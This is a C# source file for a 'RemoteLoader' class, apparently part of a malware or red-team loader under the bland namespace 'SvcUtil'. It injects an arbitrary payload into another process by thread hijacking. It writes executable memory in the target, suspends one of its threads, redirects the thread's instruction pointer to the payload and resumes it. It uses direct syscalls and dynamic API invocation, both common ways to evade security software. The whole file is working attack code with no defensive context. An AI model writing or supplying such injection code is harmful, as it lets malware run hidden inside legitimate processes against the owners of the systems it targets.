using System;
using System.Runtime.InteropServices;

namespace SvcUtil
{
    internal static class RemoteLoader
    {
        // ── Constants ───────────────────────────────────────────────

        private const uint PROCESS_ALL_ACCESS = 0x001FFFFF;
        private const uint THREAD_SUSPEND_RESUME = 0x0002;
        private const uint THREAD_GET_CONTEXT = 0x0008;
        private const uint THREAD_SET_CONTEXT = 0x0010;
        private const uint THREAD_ALL_ACCESS = THREAD_SUSPEND_RESUME |
                                                THREAD_GET_CONTEXT |
                                                THREAD_SET_CONTEXT;

        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint PAGE_READWRITE = 0x04;
        private const uint PAGE_EXECUTE_READ = 0x20;

        // CONTEXT structure offsets (x64)
        // Allocate 2688 bytes to safely cover AVX/XSTATE extensions.
        // Standard CONTEXT is 1232 bytes, but NtGetContextThread may write
        // extended state if the thread uses AVX registers.
        private const int CONTEXT_SIZE = 2688;
        private const int CONTEXT_FLAGS_OFFSET = 0x30;
        private const int CONTEXT_RIP_OFFSET = 0xF8;
        private const uint CONTEXT_FULL = 0x10000B; // CONTROL | INTEGER | SEGMENTS

        // CreateToolhelp32Snapshot flags
        private const uint TH32CS_SNAPTHREAD = 0x00000004;

        // THREADENTRY32 struct layout
        [StructLayout(LayoutKind.Sequential)]
        private struct THREADENTRY32
        {
            public uint dwSize;
            public uint cntUsage;
            public uint th32ThreadID;
            public uint th32OwnerProcessID;
            public int tpBasePri;
            public int tpDeltaPri;
            public uint dwFlags;
        }

        // ── Public API ──────────────────────────────────────────────

        public static bool Inject(int targetPid, byte[] data)
        {
            if (data == null || data.Length == 0)
                return false;

            // Initialize syscall engine
            if (!Syscall.Initialize())
                return false;

            IntPtr hProcess = IntPtr.Zero;
            IntPtr hThread = IntPtr.Zero;
            IntPtr pContext = IntPtr.Zero;

            try
            {
                // Step 1: Open target process
                int status = Syscall.NtOpenProcess(
                    out hProcess, PROCESS_ALL_ACCESS, targetPid);

                if (status != 0 || hProcess == IntPtr.Zero)
                    return false;

                // Step 2: Allocate RW memory in target
                IntPtr baseAddr = IntPtr.Zero;
                IntPtr regionSize = (IntPtr)data.Length;

                status = Syscall.NtAllocateVirtualMemory(
                    hProcess, ref baseAddr, ref regionSize,
                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

                if (status != 0 || baseAddr == IntPtr.Zero)
                    return false;

                // Step 3: Write payload to allocated region
                status = Syscall.NtWriteVirtualMemory(
                    hProcess, baseAddr, data);

                if (status != 0)
                    return false;

                // Step 4: Change protection to RX
                IntPtr protectAddr = baseAddr;
                IntPtr protectSize = (IntPtr)data.Length;
                uint oldProtect;

                status = Syscall.NtProtectVirtualMemory(
                    hProcess, ref protectAddr, ref protectSize,
                    PAGE_EXECUTE_READ, out oldProtect);

                if (status != 0)
                    return false;

                // Step 5: Find a thread in the target process
                uint threadId = FindThread(targetPid);
                if (threadId == 0)
                    return false;

                // Step 6: Open the thread handle
                hThread = DynInvoke.OpenThread(THREAD_ALL_ACCESS, false, threadId);
                if (hThread == IntPtr.Zero)
                    return false;

                // Step 7: Suspend the thread
                status = Syscall.NtSuspendThread(hThread);
                if (status != 0)
                    return false;

                // Step 8: Get current thread context
                // Allocate CONTEXT with VirtualAlloc for guaranteed alignment
                pContext = DynInvoke.VirtualAlloc(
                    IntPtr.Zero, (UIntPtr)CONTEXT_SIZE,
                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

                if (pContext == IntPtr.Zero)
                {
                    Syscall.NtResumeThread(hThread);
                    return false;
                }

                // Zero the CONTEXT buffer
                for (int i = 0; i < CONTEXT_SIZE; i++)
                    Marshal.WriteByte(pContext, i, 0);

                // Set ContextFlags to request full register state
                Marshal.WriteInt32(pContext, CONTEXT_FLAGS_OFFSET, (int)CONTEXT_FULL);

                status = Syscall.NtGetContextThread(hThread, pContext);
                if (status != 0)
                {
                    Syscall.NtResumeThread(hThread);
                    return false;
                }

                // Step 9: Redirect RIP to payload
                Marshal.WriteInt64(pContext, CONTEXT_RIP_OFFSET, baseAddr.ToInt64());

                status = Syscall.NtSetContextThread(hThread, pContext);
                if (status != 0)
                {
                    Syscall.NtResumeThread(hThread);
                    return false;
                }

                // Step 10: Resume thread
                Syscall.NtResumeThread(hThread);

                return true;
            }
            catch
            {
                return false;
            }
            finally
            {
                // Clean up handles and allocations
                if (pContext != IntPtr.Zero)
                    DynInvoke.VirtualFree(pContext, UIntPtr.Zero, 0x8000);
                if (hThread != IntPtr.Zero)
                    Syscall.NtClose(hThread);
                if (hProcess != IntPtr.Zero)
                    Syscall.NtClose(hProcess);
            }
        }

        // ── Thread enumeration ──────────────────────────────────────

        /// <summary>
        /// Find the first thread belonging to targetPid.
        /// </summary>
        private static uint FindThread(int targetPid)
        {
            IntPtr hSnap = DynInvoke.CreateToolhelp32Snapshot(
                TH32CS_SNAPTHREAD, 0);

            if (hSnap == IntPtr.Zero || hSnap == (IntPtr)(-1))
                return 0;

            try
            {
                int teSize = Marshal.SizeOf(typeof(THREADENTRY32));
                IntPtr pTE = Marshal.AllocHGlobal(teSize);

                try
                {
                    Marshal.WriteInt32(pTE, teSize); // dwSize field

                    if (!DynInvoke.Thread32First(hSnap, pTE))
                        return 0;

                    do
                    {
                        var te = (THREADENTRY32)Marshal.PtrToStructure(pTE, typeof(THREADENTRY32));
                        if (te.th32OwnerProcessID == (uint)targetPid)
                            return te.th32ThreadID;

                        // Reset dwSize (Thread32Next may require it)
                        Marshal.WriteInt32(pTE, teSize);
                    }
                    while (DynInvoke.Thread32Next(hSnap, pTE));
                }
                finally
                {
                    Marshal.FreeHGlobal(pTE);
                }
            }
            finally
            {
                DynInvoke.CloseHandle(hSnap);
            }

            return 0;
        }
    }
}
